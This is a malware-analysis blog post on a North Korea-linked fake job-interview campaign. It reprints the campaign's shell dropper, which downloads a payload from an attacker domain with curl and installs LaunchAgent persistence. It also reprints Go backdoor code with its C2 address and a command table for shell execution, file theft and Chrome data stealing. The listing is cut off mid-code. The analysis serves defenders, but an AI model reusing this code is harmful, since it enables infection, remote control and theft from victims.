<!doctype html><html lang="en" data-mode="dark"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="theme-color" media="(prefers-color-scheme: light)" content="#f7f7f7"><meta name="theme-color" media="(prefers-color-scheme: dark)" content="#1b1b1e"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black-translucent"><meta name="viewport" content="width=device-width, user-scalable=no initial-scale=1, shrink-to-fit=no, viewport-fit=cover" ><meta name="generator" content="Jekyll v4.3.4" /><meta property="og:title" content="North Korea-nexus Golang Backdoor/Stealer from Contagious Interview campaign" /><meta property="og:locale" content="en" /><meta name="description" content="On December 28, 2024, @tayvano_ shared a great thread on X describing activity consistent with what is typically known as the “Contagious Interview” campaign conducted by North Korea-nexus threat actors. In the activity, victims were contacted via platforms such as LinkedIn and were offered a job interview. Victims were sent a link to sites impersonating the legitimate Willo candidate screening site. The fake sites eventually displayed a fake error and provided users with a malicious fix, such as the following command. The victims are lured into copying/pasting the command on their devices, triggering the download and installation of the payload. This type of activity has been very common in the cybercrime scene in the last year, typically leading to RATs, and lately to LummaC2 Stealer. The Contagious Interview activity, though, has a different intent. It is typically conducted to drain cryptocurrency wallets. There are dozens of reports estimating the millions that North Korean threat actors have made in cryptocurrency heists. @500mk500 subsequently did some really nice discovery of related domains impersonating Willo. @tayvano_ was kind enough to share a hash from this campaign with me, so I took a look at the payload." /><meta property="og:description" content="On December 28, 2024, @tayvano_ shared a great thread on X describing activity consistent with what is typically known as the “Contagious Interview” campaign conducted by North Korea-nexus threat actors. In the activity, victims were contacted via platforms such as LinkedIn and were offered a job interview. Victims were sent a link to sites impersonating the legitimate Willo candidate screening site. The fake sites eventually displayed a fake error and provided users with a malicious fix, such as the following command. The victims are lured into copying/pasting the command on their devices, triggering the download and installation of the payload. This type of activity has been very common in the cybercrime scene in the last year, typically leading to RATs, and lately to LummaC2 Stealer. The Contagious Interview activity, though, has a different intent. It is typically conducted to drain cryptocurrency wallets. There are dozens of reports estimating the millions that North Korean threat actors have made in cryptocurrency heists. @500mk500 subsequently did some really nice discovery of related domains impersonating Willo. @tayvano_ was kind enough to share a hash from this campaign with me, so I took a look at the payload." /><link rel="canonical" href="https://dmpdump.github.io/posts/NorthKorea_Backdoor_Stealer/" /><meta property="og:url" content="https://dmpdump.github.io/posts/NorthKorea_Backdoor_Stealer/" /><meta property="og:site_name" content="dmpdump" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2025-01-05T00:00:00+00:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="North Korea-nexus Golang Backdoor/Stealer from Contagious Interview campaign" /><meta name="twitter:site" content="@G60930953" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2025-01-05T23:30:28+00:00","datePublished":"2025-01-05T00:00:00+00:00","description":"On December 28, 2024, @tayvano_ shared a great thread on X describing activity consistent with what is typically known as the “Contagious Interview” campaign conducted by North Korea-nexus threat actors. In the activity, victims were contacted via platforms such as LinkedIn and were offered a job interview. Victims were sent a link to sites impersonating the legitimate Willo candidate screening site. The fake sites eventually displayed a fake error and provided users with a malicious fix, such as the following command. The victims are lured into copying/pasting the command on their devices, triggering the download and installation of the payload. This type of activity has been very common in the cybercrime scene in the last year, typically leading to RATs, and lately to LummaC2 Stealer. The Contagious Interview activity, though, has a different intent. It is typically conducted to drain cryptocurrency wallets. There are dozens of reports estimating the millions that North Korean threat actors have made in cryptocurrency heists. @500mk500 subsequently did some really nice discovery of related domains impersonating Willo. @tayvano_ was kind enough to share a hash from this campaign with me, so I took a look at the payload.","headline":"North Korea-nexus Golang Backdoor/Stealer from Contagious Interview campaign","mainEntityOfPage":{"@type":"WebPage","@id":"https://dmpdump.github.io/posts/NorthKorea_Backdoor_Stealer/"},"url":"https://dmpdump.github.io/posts/NorthKorea_Backdoor_Stealer/"}</script><title>North Korea-nexus Golang Backdoor/Stealer from Contagious Interview campaign | dmpdump</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="dmpdump"><meta name="application-name" content="dmpdump"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.googleapis.com" ><link rel="dns-prefetch" href="https://fonts.googleapis.com" ><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link rel="dns-prefetch" href="https://fonts.gstatic.com" ><link rel="preconnect" href="https://cdn.jsdelivr.net" ><link rel="dns-prefetch" href="https://cdn.jsdelivr.net" ><link rel="stylesheet" href="/assets/css/jekyll-theme-chirpy.css"><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400&family=Source+Sans+Pro:wght@400;600;700;900&display=swap"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.6.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/tocbot@4.29.0/dist/tocbot.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/loading-attribute-polyfill@2.1.1/dist/loading-attribute-polyfill.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/glightbox@3.3.0/dist/css/glightbox.min.css"><body><aside aria-label="Sidebar" id="sidebar" class="d-flex flex-column align-items-end"><header class="profile-wrapper"> <a href="/" id="avatar" class="rounded-circle"><img src="/assets/images/avatar.png" width="112" height="112" alt="avatar" onerror="this.style.display='none'"></a><h1 class="site-title"> <a href="/">dmpdump</a></h1><p class="site-subtitle fst-italic mb-0">CTI, RE, Programming</p></header><nav class="flex-column flex-grow-1 w-100 ps-0"><ul class="nav"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info-circle"></i> <span>ABOUT</span> </a></ul></nav><div class="sidebar-bottom d-flex flex-wrap align-items-center w-100"> <a href="https://github.com/dmpdump" aria-label="github" target="_blank" rel="noopener noreferrer" > <i class="fab fa-github"></i> </a> <a href="https://twitter.com/G60930953" aria-label="twitter" target="_blank" rel="noopener noreferrer" > <i class="fa-brands fa-x-twitter"></i> </a> <a href="javascript:location.href = 'mailto:' + ['dmpdump','tuta.io'].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></aside><div id="main-wrapper" class="d-flex justify-content-center"><div class="container d-flex flex-column px-xxl-5"><header id="topbar-wrapper" aria-label="Top Bar"><div id="topbar" class="d-flex align-items-center justify-content-between px-lg-3 h-100" ><nav id="breadcrumb" aria-label="Breadcrumb"> <span> <a href="/">Home</a> </span> <span>North Korea-nexus Golang Backdoor/Stealer from Contagious Interview campaign</span></nav><button type="button" id="sidebar-trigger" class="btn btn-link"> <i class="fas fa-bars fa-fw"></i> </button><div id="topbar-title"> Post</div><button type="button" id="search-trigger" class="btn btn-link"> <i class="fas fa-search fa-fw"></i> </button> <search id="search" class="align-items-center ms-3 ms-lg-0"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..." > </search> <button type="button" class="btn btn-link text-decoration-none" id="search-cancel">Cancel</button></div></header><div class="row flex-grow-1"><main aria-label="Main Content" class="col-12 col-lg-11 col-xl-9 px-md-4"><article class="px-1"><header><h1 data-toc-skip>North Korea-nexus Golang Backdoor/Stealer from Contagious Interview campaign</h1><div class="post-meta text-muted"> <span> Posted <time data-ts="1736035200" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jan 5, 2025 </time> </span> <span> Updated <time data-ts="1736119828" data-df="ll" data-bs-toggle="tooltip" data-bs-placement="bottom" > Jan 5, 2025 </time> </span><div class="d-flex justify-content-between"> <span> By <em> <a href="https://github.com/dmpdump">dmpdump</a> </em> </span><div> <span class="readtime" data-bs-toggle="tooltip" data-bs-placement="bottom" title="2984 words" > <em>16 min</em> read</span></div></div></div></header><div class="content"><p>On December 28, 2024, <a href="https://x.com/tayvano_">@tayvano_</a> shared a <a href="https://x.com/tayvano_/status/1872980013542457802">great thread</a> on X describing activity consistent with what is typically known as the “Contagious Interview” campaign conducted by North Korea-nexus threat actors. In the activity, victims were contacted via platforms such as LinkedIn and were offered a job interview. Victims were sent a link to sites impersonating the legitimate <a href="https://www.willo.video/">Willo</a> candidate screening site. The fake sites eventually displayed a fake error and provided users with a malicious fix, such as the following <a href="https://x.com/tayvano_/status/1872980032752415227">command</a>. The victims are lured into copying/pasting the command on their devices, triggering the download and installation of the payload. This type of activity has been very common in the cybercrime scene in the last year, typically leading to RATs, and lately to LummaC2 Stealer. The Contagious Interview activity, though, has a different intent. It is typically conducted to drain cryptocurrency wallets. There are dozens of reports estimating the millions that North Korean threat actors have made in cryptocurrency heists. <a href="https://x.com/500mk500/status/1873034624122909159">@500mk500</a> subsequently did some really nice discovery of related domains impersonating Willo. @tayvano_ was kind enough to share a hash from this campaign with me, so I took a look at the payload.</p><ul><li>File Name: VCam_intel.zip<li>Hash: 60ec2dbe8cfacdff1d4eb093032b0307e52cc68feb1f67487d9f401017c3edd7</ul><p>The file contained Golang source code and a Chrome Update Mach-O app, and had very low detection:</p><p><a href="/assets/images/dprk_chrome/lowdetect.png" class="popup img-link shimmer"><img src="/assets/images/dprk_chrome/lowdetect.png" alt="sshot" loading="lazy"></a></p><p>Pivoting on the hash, I found related files and domains. At least one of the download domains was https://www.api.camera-drive[.]cloud/result/VCam_intel.zip. I also found a ZIP file containing a collection of artifacts from the campaign (hash: 60ec2dbe8cfacdff1d4eb093032b0307e52cc68feb1f67487d9f401017c3edd7).</p><p><a href="/assets/images/dprk_chrome/pivot.png" class="popup img-link shimmer"><img src="/assets/images/dprk_chrome/pivot.png" alt="sshot" loading="lazy"></a></p><p>ZIP file with a collection of artifacts: <a href="/assets/images/dprk_chrome/parentzip.png" class="popup img-link shimmer"><img src="/assets/images/dprk_chrome/parentzip.png" alt="sshot" loading="lazy"></a></p><p>This ZIP file contains artifacts to target Windows, Mac, and Linux, which is consistent with the multi-platform targeting of this threat actor and the use of cross-platform languages such as Golang. I’ll focus on the artifacts affecting Mac users. The script executed in the “fake fix” lure is likely <code class="language-plaintext highlighter-rouge">ffmpeg.sh</code>. This shell script triggers the download, execution, and persistence of the payload, along with a Mach-O app.</p><p><code class="language-plaintext highlighter-rouge">ffmpeg.sh</code> does a few things:</p><ul><li>It defines variables, that can be updated with different file names and domains<li>It has code to determine if the target system is running on the Intel or ARM architecture, and download the corresponding payload<li>It downloads and unpacks an archive (which is the archive originally by @tayvano_)<li>It establishes a persistent LaunchAgent service for the malware<li>It runs a the ChromeUpdateAlert.app Mach-O application</ul><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># Define variables for URLs</span>
<span class="nv">ZIP_URL_ARM64</span><span class="o">=</span><span class="s2">"https://api.nvidia-cloud[.]online/VCam1.update"</span>
<span class="nv">ZIP_URL_INTEL</span><span class="o">=</span><span class="s2">"https://api.nvidia-cloud[.]online/VCam2.update"</span>
<span class="nv">ZIP_FILE</span><span class="o">=</span><span class="s2">"/var/tmp/VCam.zip"</span>                        <span class="c"># Path to save the downloaded ZIP file</span>
<span class="nv">WORK_DIR</span><span class="o">=</span><span class="s2">"/var/tmp/VCam"</span>                            <span class="c"># Temporary directory for extracted files</span>
<span class="nv">EXECUTABLE</span><span class="o">=</span><span class="s2">"vcamservice.sh"</span>                         <span class="c"># Replace with the name of the executable file inside the ZIP</span>
<span class="nv">APP</span><span class="o">=</span><span class="s2">"ChromeUpdateAlert.app"</span>                         <span class="c"># Replace with the name of the app to open</span>
<span class="nv">PLIST_FILE</span><span class="o">=</span>~/Library/LaunchAgents/com.vcam.plist    <span class="c"># Path to the plist file</span>

<span class="c"># Determine CPU architecture</span>
<span class="k">case</span> <span class="si">$(</span><span class="nb">uname</span> <span class="nt">-m</span><span class="si">)</span> <span class="k">in
    </span>arm64<span class="p">)</span> <span class="nv">ZIP_URL</span><span class="o">=</span><span class="nv">$ZIP_URL_ARM64</span> <span class="p">;;</span>    
    x86_64<span class="p">)</span> <span class="nv">ZIP_URL</span><span class="o">=</span><span class="nv">$ZIP_URL_INTEL</span> <span class="p">;;</span>
    <span class="k">*</span><span class="p">)</span> <span class="nb">exit </span>1 <span class="p">;;</span>  <span class="c"># Exit for unsupported architectures</span>
<span class="k">esac</span>

<span class="c"># Create working directory</span>
<span class="nb">mkdir</span> <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$WORK_DIR</span><span class="s2">"</span>

<span class="c"># Function to clean up</span>
cleanup<span class="o">()</span> <span class="o">{</span>
    <span class="nb">rm</span> <span class="nt">-rf</span> <span class="s2">"</span><span class="nv">$ZIP_FILE</span><span class="s2">"</span>
<span class="o">}</span>

<span class="c"># Download, unzip, and execute</span>
<span class="k">if </span>curl <span class="nt">-s</span> <span class="nt">-o</span> <span class="s2">"</span><span class="nv">$ZIP_FILE</span><span class="s2">"</span> <span class="s2">"</span><span class="nv">$ZIP_URL</span><span class="s2">"</span> <span class="o">&amp;&amp;</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$ZIP_FILE</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span>unzip <span class="nt">-o</span> <span class="nt">-qq</span> <span class="s2">"</span><span class="nv">$ZIP_FILE</span><span class="s2">"</span> <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$WORK_DIR</span><span class="s2">"</span>
    <span class="k">if</span> <span class="o">[[</span> <span class="nt">-f</span> <span class="s2">"</span><span class="nv">$WORK_DIR</span><span class="s2">/</span><span class="nv">$EXECUTABLE</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
        </span><span class="nb">chmod</span> +x <span class="s2">"</span><span class="nv">$WORK_DIR</span><span class="s2">/</span><span class="nv">$EXECUTABLE</span><span class="s2">"</span>
    <span class="k">else
        </span>cleanup
        <span class="nb">exit </span>1
    <span class="k">fi
else
    </span>cleanup
    <span class="nb">exit </span>1
<span class="k">fi</span>

<span class="c"># Step 4: Register the service</span>
<span class="nb">mkdir</span> <span class="nt">-p</span> ~/Library/LaunchAgents

<span class="nb">cat</span> <span class="o">&gt;</span> <span class="s2">"</span><span class="nv">$PLIST_FILE</span><span class="s2">"</span> <span class="o">&lt;&lt;</span><span class="no">EOL</span><span class="sh">
&lt;?xml version="1.0" encoding="UTF-8"?&gt;
&lt;!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd"&gt;
&lt;plist version="1.0"&gt;
&lt;dict&gt;
    &lt;key&gt;Label&lt;/key&gt;
    &lt;string&gt;com.vcam&lt;/string&gt;
    &lt;key&gt;ProgramArguments&lt;/key&gt;
    &lt;array&gt;
        &lt;string&gt;</span><span class="nv">$WORK_DIR</span><span class="sh">/</span><span class="nv">$EXECUTABLE</span><span class="sh">&lt;/string&gt;
    &lt;/array&gt;
    &lt;key&gt;RunAtLoad&lt;/key&gt;
    &lt;true/&gt;
    &lt;key&gt;KeepAlive&lt;/key&gt;
    &lt;false/&gt;
&lt;/dict&gt;
&lt;/plist&gt;
</span><span class="no">EOL

</span><span class="nb">chmod </span>644 <span class="s2">"</span><span class="nv">$PLIST_FILE</span><span class="s2">"</span>

<span class="k">if</span> <span class="o">!</span> launchctl list | <span class="nb">grep</span> <span class="nt">-q</span> <span class="s2">"com.vcam"</span><span class="p">;</span> <span class="k">then
    </span>launchctl load <span class="s2">"</span><span class="nv">$PLIST_FILE</span><span class="s2">"</span>
<span class="k">fi</span>

<span class="c"># Step 5: Run ChromeUpdateAlert.app</span>
<span class="k">if</span> <span class="o">[[</span> <span class="nt">-d</span> <span class="s2">"</span><span class="nv">$WORK_DIR</span><span class="s2">/</span><span class="nv">$APP</span><span class="s2">"</span> <span class="o">]]</span><span class="p">;</span> <span class="k">then
    </span>open <span class="s2">"</span><span class="nv">$WORK_DIR</span><span class="s2">/</span><span class="nv">$APP</span><span class="s2">"</span> &amp;
<span class="k">fi</span>

<span class="c"># Final cleanup</span>
cleanup
</pre></table></code></div></div><p>The shell script set in the <code class="language-plaintext highlighter-rouge">EXECUTABLE="vcamservice.sh" </code> variable has a key role in the execution and persistence of the malicious Golang payload. It has a fake “Installing dependencies” message and it runs <code class="language-plaintext highlighter-rouge">app.go</code> with the <code class="language-plaintext highlighter-rouge">go run</code> command, which builds and runs the Golang project from the source code.</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
</pre><td class="rouge-code"><pre><span class="c">#!/bin/bash</span>

<span class="c"># Set the working directory to the folder where this script is located</span>
<span class="nb">cd</span> <span class="s2">"</span><span class="si">$(</span><span class="nb">dirname</span> <span class="s2">"</span><span class="nv">$0</span><span class="s2">"</span><span class="si">)</span><span class="s2">"</span>

<span class="nb">echo</span> <span class="s2">"Installing Dependencies..."</span>

<span class="nv">project_file</span><span class="o">=</span><span class="s2">"app.go"</span>
./bin/go run <span class="s2">"</span><span class="nv">$project_file</span><span class="s2">"</span>

<span class="nb">exit </span>0
</pre></table></code></div></div><h1 id="golang-backdoorstealer">Golang Backdoor/Stealer</h1><p>VCam_intel.zip contains various source code artifacts for the malicious Golang payload, the Chrome Update Mach-O, and the shell script for the build/execution of the Golang malware.</p><p><a href="/assets/images/dprk_chrome/vcamcontent.png" class="popup img-link shimmer"><img src="/assets/images/dprk_chrome/vcamcontent.png" alt="sshot" loading="lazy"></a></p><p>We can start reviewing the Golang payload from the app.go source file. This file contains two functions.</p><p><code class="language-plaintext highlighter-rouge">RunDll</code>: In our case it does not run any DLLs, it simply sets the C2 url (http://216.74.123[.]191:8080), it checks if there is another instance of the malware running, it generates a random id, which is written to disk in a <code class="language-plaintext highlighter-rouge">.host</code> file in the temp folder, and it starts the main execution loop in a function called <code class="language-plaintext highlighter-rouge">StartMainLoop</code>.<br /> <code class="language-plaintext highlighter-rouge">generateId</code>: This generates a random id for each victim.</p><div class="language-golang highlighter-rouge"><div class="code-header"> <span data-label-text="Golang"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
</pre><td class="rouge-code"><pre><span class="k">func</span> <span class="n">generateId</span><span class="p">()</span> <span class="kt">string</span> <span class="p">{</span>
	<span class="n">hostfile</span> <span class="o">:=</span> <span class="n">filepath</span><span class="o">.</span><span class="n">Join</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">TempDir</span><span class="p">(),</span> <span class="n">config</span><span class="o">.</span><span class="n">MACHINEID_FILE_NAME</span><span class="p">)</span>
	<span class="n">data</span><span class="p">,</span> <span class="n">err</span> <span class="o">:=</span> <span class="n">os</span><span class="o">.</span><span class="n">ReadFile</span><span class="p">(</span><span class="n">hostfile</span><span class="p">)</span>

	<span class="k">if</span> <span class="n">err</span> <span class="o">==</span> <span class="no">nil</span> <span class="p">{</span>
		<span class="k">return</span> <span class="kt">string</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
	<span class="p">}</span>

	<span class="c">// initialize id</span>
	<span class="n">data</span> <span class="o">=</span> <span class="nb">make</span><span class="p">([]</span><span class="kt">byte</span><span class="p">,</span> <span class="m">4</span><span class="p">)</span>
	<span class="n">rand</span><span class="o">.</span><span class="n">Read</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

	<span class="n">id</span> <span class="o">:=</span> <span class="n">hex</span><span class="o">.</span><span class="n">EncodeToString</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>

	<span class="n">os</span><span class="o">.</span><span class="n">WriteFile</span><span class="p">(</span><span class="n">hostfile</span><span class="p">,</span> <span class="p">[]</span><span class="kt">byte</span><span class="p">(</span><span class="n">id</span><span class="p">),</span> <span class="m">0</span><span class="n">o644</span><span class="p">)</span>

	<span class="k">return</span> <span class="n">id</span>
<span class="p">}</span>


<span class="k">func</span> <span class="n">RunDLL</span><span class="p">()</span> <span class="p">{</span>
	<span class="nb">print</span><span class="p">(</span><span class="s">"================= RunDLL =================</span><span class="se">\n</span><span class="s">"</span><span class="p">)</span>
	<span class="n">instance</span><span class="o">.</span><span class="n">Delay</span><span class="p">()</span>
	<span class="n">instance</span><span class="o">.</span><span class="n">CheckDupInstance</span><span class="p">()</span>
	<span class="n">instance</span><span class="o">.</span><span class="n">RegisterInstance</span><span class="p">()</span>

	<span class="c">//url := "https://api.jz-aws[.]info/public/images/" </span>
	 <span class="n">url</span> <span class="o">:=</span> <span class="s">"http://216.74.123[.]191:8080"</span>
	<span class="c">// url := "http://127.0.0.1:8080"</span>
	<span class="n">id</span> <span class="o">:=</span> <span class="n">generateId</span><span class="p">()</span>  
	<span class="n">fmt</span><span class="o">.</span><span class="n">Printf</span><span class="p">(</span><span class="s">"UUID: %s, URL: %s</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span> <span class="n">id</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>

	<span class="n">core</span><span class="o">.</span><span class="n">StartMainLoop</span><span class="p">(</span><span class="n">id</span><span class="p">,</span> <span class="n">url</span><span class="p">)</span>
<span class="p">}</span>

<span class="c">//export DllRegisterServer</span>
<span class="c">// func DllRegisterServer() {</span>
<span class="c">// 	RunDLL()</span>
<span class="c">// }</span>

<span class="c">// main</span>
<span class="k">func</span> <span class="n">main</span><span class="p">()</span> <span class="p">{</span>

	<span class="n">RunDLL</span><span class="p">()</span>
<span class="p">}</span>
</pre></table></code></div></div><p>Of interest, we can see various code artifacts that are commented out, including a domain (https://api.jz-aws[.]info/public/images/) which was previously reported by <a href="https://www.sonatype.com/blog/cors-parser-npm-package-hides-cross-platform-backdoor-in-png-files">Sonatype</a> in the context of a trojanized npm package.</p><p>The main loop of the backdoor/stealer receives 2 string arguments, the random id and the C2 URL. It implements a persistent connection to the C2 and accepts the following commands, which have constants assigned to them in a configuration file. The commands slice byte arrays provided from the C2 and use the slices for specific command actions (e.g. specifying a path for the file upload/download, or a command execution mode).</p><div class="table-wrapper"><table><thead><tr><th>Command<th>Command Constant<th>Action<tbody><tr><td>COMMAND_INFO<td>qwer<td>Returns username, hostname, OS, and architecture<tr><td>COMMAND_UPLOAD<td>asdf<td>Drops and decompresses a file to a specific path<tr><td>COMMAND_DOWNLOAD<td>zxcv<td>Gets files or directories. If it is a directory, it compresses it as .tar.gz<tr><td>COMMAND_OSSHELL<td>vbcx<td>Runs commands in 2 modes (SHELL_MODE_WAITGETOUT and SHELL_MODE_DETACH). WAITGETOUT waits for completion, DETACH does not<tr><td>COMMAND_AUTO<td>r4ys<td>Core Chrome stealer command, with various sub-commands described below<tr><td>COMMAND_WAIT<td>ghdj<td>Sleeps for a specific amount of time<tr><td>COMMAND_EXIT<td>dghh<td>Returns an “exited” message</table></div><div class="language-golang highlighter-rouge"><div class="code-header"> <span data-label-text="Golang"><i class="fas fa-code fa-fw small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
73
74
75
76
77
78
79
80
81
82
83
84
85
86
87
88
89
90
91
92
93
94
95
96
97
98
99
100
101
102
103
104
105
106
107
108
109
110
111
112
113
114
115
116
117
118
119
120
121
122
123
124
125
126
127
128
129
130
131
132
133
134
135
136
137
138
139
140
141
142
143
144
145
146
147
148
149
150
151
152
153
154
155
156
157
158
159
160
161
162
163
164
165
166
167
168
169
170
171
172
173
174
175
176
177
178
179
180
181
182
183
184
185
186
187
188
189
190
191
192
193
194
195
196
197
198
199
200
201
202
203
204
205
206
207
208
209
210
211
212
213
214
215
216
217
218
219
220
221
222
223
224
225
226
227
228
229
230
231
232
233
234
235
236
237
238
239
240
</pre><td class="rouge-code"><pre><span class="k">package</span> <span class="n">core</span>

<span class="k">import</span> <span class="p">(</span>
	<span class="s">"bits-project/bits/auto"</span>
	<span class="s">"bits-project/bits/command"</span>
	<span class="s">"bits-project/bits/config"</span>
	<span class="s">"bits-project/bits/transport"</span>
	<span class="s">"bits-project/bits/util"</span>
	<span class="s">"bytes"</span>
	<span class="s">"context"</span>
	<span class="s">"crypto/rand"</span>
	<span class="s">"fmt"</span>
	<span class="s">"os"</span>
	<span class="s">"os/exec"</span>
	<span class="s">"os/user"</span>
	<span class="s">"path/filepath"</span>
	<span class="s">"runtime"</span>
	<span class="s">"strconv"</span>
	<span class="s">"strings"</span>
	<span class="s">"time"</span>
<span class="p">)</span>

<span class="k">func</span> <span class="n">StartMainLoop</span><span class="p">(</span><span class="n">id</span> <span class="kt">string</span><span class="p">,</span> <span class="n">url</span> <span class="kt">string</span><span class="p">)</span> <span class="p">{</span>

	<span class="k">var</span> <span class="p">(</span>
		<span class="n">msg_type</span> <span class="kt">string</span>
		<span class="n">msg_data</span> <span class="p">[][]</span><span class="kt">byte</span>
		<span class="n">msg</span>      <span class="kt">string</span>
		<span class="n">cmd</span>      <span class="kt">string</span>
		<span class="n">cmd_type</span> <span class="kt">string</span>
		<span class="n">cmd_data</span> <span class="p">[][]</span><span class="kt">byte</span>
		<span class="n">alive</span>    <span class="kt">bool</span>
	<span class="p">)</span>

	<span class="c">// initialize</span>
	<span class="n">cmd_type</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">COMMAND_INFO</span>
	<span class="n">alive</span> <span class="o">=</span> <span class="no">true</span>
	<span class="k">for</span> <span class="n">alive</span> <span class="p">{</span>
		<span class="k">func</span><span class="p">()</span> <span class="p">{</span>

			<span class="c">// recover panic state</span>
			<span class="k">defer</span> <span class="k">func</span><span class="p">()</span> <span class="p">{</span>
				<span class="k">if</span> <span class="n">r</span> <span class="o">:=</span> <span class="nb">recover</span><span class="p">();</span> <span class="n">r</span> <span class="o">!=</span> <span class="no">nil</span> <span class="p">{</span>
					<span class="n">cmd_type</span> <span class="o">=</span> <span class="n">config</span><span class="o">.</span><span class="n">COMMAND_INFO</span>
					<span class="n">time</span><span class="o">.</span><span class="n">Sleep</span><span class="p">(</span><span class="n">config</span><span class="o">.</span><span class="n">DURATION_ERROR_WAIT</span><span class="p">)</span>
				<span class="p">}</span>
			<span class="p">}()</span>

			<span class="k">switch</span> <span class="n">cmd_type</span> <span class="p">{</span>
			<span class="k">case</span> <span class="n">config</span><span class="o">.</span><span class="n">COMMAND_INFO</span><span class="o">:</span>
				<span class="n">msg_type</span><span class="p">,</span> <span class="n">msg_data</span> <span class="o">=</span> <span class="n">processInfo</span><span class="p">()</span>
			<span class="k">case</span> <span class="n">config</span><span class="o">.</span><span class="n">COMMAND_UPLOAD</span><span class="o">:</span>
				<span class="n">msg_type</span><span class="p">,</span> <span class="n">msg_data</span> <span class="o">=</span> <span class="n">processUpload</span><span class="p">(</span><span class="n">cmd_data</span><span class="p">)</span>
			<span class="k">case</span> <span class="n">config</span><span class="o">.</span><span class="n">COMMAND_DOWNLOAD</span><span class="o">:</span>
				<span class="n">msg_type</span><span class="p">,</span> <span class="n">msg_data</span> <span class="o">=</span> <span class="n">processDownload</span><span class="p">(</span><span class="n">cmd_data</span><span class="p">)</span>
			<span class="k">case</span> <span class="n">config</span><span class="o">.</span><span class="n">COMMAND_OSSHELL</span><span class="o">:</span>
				<span class="n">msg_type</span><span class="p">,</span> <span class="n">msg_data</span> <span class="o">=</span> <span class="n">processOsShell</span><span class="p">(</span><span class="n">cmd_data</span><span class="p">)</span>
